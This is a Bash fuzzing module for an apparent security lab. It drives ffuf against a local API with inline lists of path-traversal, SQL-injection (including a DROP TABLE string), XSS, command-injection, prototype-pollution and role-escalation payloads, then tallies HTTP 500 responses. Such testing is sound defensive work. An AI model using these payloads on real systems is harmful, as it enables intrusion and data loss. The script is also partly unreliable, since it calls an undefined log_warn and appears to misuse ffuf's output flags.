#!/usr/bin/env bash
# =============================================================================
# 04-api-fuzzing.sh — API Fuzzing Module (ffuf)
# =============================================================================
# Payloads: path traversal, injection, special characters
# Endpoints: /api/test, /auth/login (estratégicos)
# Monitora: HTTP 500, exceptions, stacktraces
# =============================================================================

set -euo pipefail

TARGET_URL="${1:-http://localhost:8080}"
REPORT_DIR="${2:-/workspace/logs/security-lab}"
LOG_DIR="${3:-$REPORT_DIR/logs}"
TIMESTAMP="$(date -u '+%Y%m%d_%H%M%S')"

mkdir -p "$LOG_DIR/fuzzing"

log_info() { echo "  [*] $1"; }
log_ok()   { echo "  [+] $1"; }
log_fail() { echo "  [-] $1"; }

# ── Verificar ffuf ──
if ! command -v ffuf &>/dev/null; then
  log_fail "ffuf not found — skipping fuzzing"
  exit 42
fi

HOST=$(echo "$TARGET_URL" | sed -E 's|https?://([^:/]+).*|\1|')
PORT=$(echo "$TARGET_URL" | sed -E 's|https?://[^:/]+:?([0-9]*).*|\1|')
BASE="$TARGET_URL"

log_info "Starting API Fuzzing against $TARGET_URL"
log_info "WARNING: This will send malformed payloads — expect some 4xx/5xx"

FFUF_LOG="$LOG_DIR/fuzzing/fuzzing-${TIMESTAMP}.log"
FUZZ_RESULTS="$REPORT_DIR/metrics/fuzzing-results-${TIMESTAMP}.json"
INTERESTING_FILE="$LOG_DIR/fuzzing/interesting-${TIMESTAMP}.txt"

touch "$INTERESTING_FILE"

# ──────── 1. Path Traversal em endpoints públicos ────────
echo "=== Path Traversal: /api/test ===" | tee -a "$FFUF_LOG"

ffuf -u "$BASE/api/test?file=FUZZ" \
  -w /dev/stdin \
  -mc 200,500,403 \
  -t 20 \
  -timeout 10 \
  -o json \
  -od "$LOG_DIR/fuzzing/traversal-api-test-${TIMESTAMP}.json" \
  << 'PAYLOADS' 2>&1 | tail -5 >> "$FFUF_LOG" || true
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
..\\..\\..\\windows\\win.ini
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
%00
PAYLOADS

# ──────── 2. SQL Injection em login ────────
echo "=== SQL Injection: /auth/login ===" | tee -a "$FFUF_LOG"

ffuf -u "$BASE/auth/login" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"name":"FUZZ","password":"FUZZ"}' \
  -w /dev/stdin \
  -mc 200,500,403 \
  -t 20 \
  -timeout 10 \
  -o json \
  -od "$LOG_DIR/fuzzing/sqli-${TIMESTAMP}.json" \
  << 'PAYLOADS' 2>&1 | tail -5 >> "$FFUF_LOG" || true
admin' --
admin" --
' OR 1=1 --
" OR 1=1 --
admin' UNION SELECT * FROM user --
admin'/* 
admin' AND 1=1 --
admin' AND 1=2 --
'; DROP TABLE user --
PAYLOADS

# ──────── 3. Special Characters em parâmetros ────────
echo "=== Special Characters: /api/test ===" | tee -a "$FFUF_LOG"

ffuf -u "$BASE/api/test?input=FUZZ" \
  -w /dev/stdin \
  -mc 200,500 \
  -t 15 \
  -timeout 10 \
  -o json \
  -od "$LOG_DIR/fuzzing/special-chars-${TIMESTAMP}.json" \
  << 'PAYLOADS' 2>&1 | tail -5 >> "$FFUF_LOG" || true
<script>alert(1)</script>
<img src=x onerror=alert(1)>
${7*7}
{{7*7}}
<%= 7*7 %>
;id;
| id
`id`
$(id)
%s%s%s%s%s
\x00\x00\x00
../../../../../../../../etc/passwd
null
undefined
NaN
true
false
[]
{}
''
""
PAYLOADS

# ──────── 4. JSON Injection no register ────────
echo "=== JSON Injection: /auth/register ===" | tee -a "$FFUF_LOG"

ffuf -u "$BASE/auth/register" \
  -X POST \
  -H "Content-Type: application/json" \
  -d 'FUZZ' \
  -w /dev/stdin \
  -mc 200,400,500 \
  -t 15 \
  -timeout 10 \
  -o json \
  -od "$LOG_DIR/fuzzing/json-inject-${TIMESTAMP}.json" \
  << 'PAYLOADS' 2>&1 | tail -5 >> "$FFUF_LOG" || true
{"name":"test","password":"test","email":"test@test.com","role":"ADMIN"}
{"name":"test","password":"test","email":"test@test.com","role":"SUPER_ADMIN"}
{"name":"test","password":"test","email":"test@test.com","$where":"1==1"}
[object Object]
{"__proto__":{"admin":true}}
{"constructor":{"prototype":{"admin":true}}}
PAYLOADS

# ──────── Analisar resultados ────────
log_info "Analyzing fuzzing results..."

CRASHES=0
EXCEPTIONS=0
INTERESTING=0

# Procurar por HTTP 500 (potenciais crashes)
for f in "$LOG_DIR"/fuzzing/*.json; do
  if [ -f "$f" ]; then
    count=$(jq '[.results[] | select(.status == 500)] | length' "$f" 2>/dev/null || echo 0)
    if [ "$count" -gt 0 ]; then
      echo "[!] $count HTTP 500(s) in $(basename "$f")" >> "$INTERESTING_FILE"
      INTERESTING=$((INTERESTING + count))
      jq '[.results[] | select(.status == 500) | {status, url, payload: .input}]' "$f" 2>/dev/null \
        >> "$INTERESTING_FILE" || true
    fi
    # Contar resultados com status code incomum
    unusual=$(jq '[.results[] | select(.status >= 400 and .status != 401 and .status != 404)] | length' "$f" 2>/dev/null || echo 0)
    EXCEPTIONS=$((EXCEPTIONS + unusual))
  fi
done

log_info "Fuzzing Results:"
echo "    Interesting responses (500+): $INTERESTING"
echo "    Unusual HTTP codes: $EXCEPTIONS"
echo "    Details: $INTERESTING_FILE"

jq -n \
  --arg interesting "$INTERESTING" \
  --arg exceptions "$EXCEPTIONS" \
  '{http_500_or_more: ($interesting|tonumber), unusual_responses: ($exceptions|tonumber)}' \
  > "$REPORT_DIR/metrics/fuzzing-summary-${TIMESTAMP}.json"

if [ "$INTERESTING" -gt 0 ]; then
  log_warn "Found $INTERESTING potentially interesting responses — check logs"
fi

log_ok "Fuzzing completed"
exit 0
